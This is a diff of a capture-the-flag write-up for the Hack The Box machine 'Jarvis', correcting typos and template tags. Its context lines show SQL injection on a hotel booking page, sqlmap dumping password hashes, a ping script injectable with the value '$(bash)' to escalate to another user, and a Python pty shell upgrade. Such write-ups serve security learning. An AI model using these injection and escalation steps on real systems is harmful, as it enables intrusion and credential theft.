@@ -105,7 +105,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 On the port 80, there is a website which we can researve a room of a hotel.
 ![placeholder](https://inar1.github.io/public/images/2019-11-10/2019-11-09-19-40-46.png)
 
-In the path "", we have a parameter for GET request which is "cod".
+In the path "/room.php", we have a parameter for GET request which is "cod".
 ![placeholder](https://inar1.github.io/public/images/2019-11-10/2019-11-09-19-41-30.png)
 
 By putting a single quote, we can confirm that there is no picture.<br>
@@ -180,7 +180,7 @@ database management system users password hashes:
 [21:00:11] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'
 
 [*] ending @ 21:00:11 /2019-11-09/
-*{% endhighlight %}
+{% endhighlight %}
 
 After that, try to login to phpadmin with the credential.<br>
 We can figure out that the version of phpmyadmin is "4.8.0"
@@ -433,7 +433,7 @@ def exec_ping():
     os.system('ping ' + command)
 {% endhighlight %}
 
-Then, get a full shell like following.
+Besides, get a full shell like following.
 {% highlight shell %}
 python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@jarvis:/var/www/Admin-Utilities$
@@ -456,7 +456,7 @@ www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilitie
 Enter an IP: $(bash)
 $(bash)
 pepper@jarvis:/var/www/Admin-Utilities$
-**{% endhighlight %}
+{% endhighlight %}
 
 However, we can't get any output from this terminal.<br>
 So get another reverse shell as a user "pepper".<br>
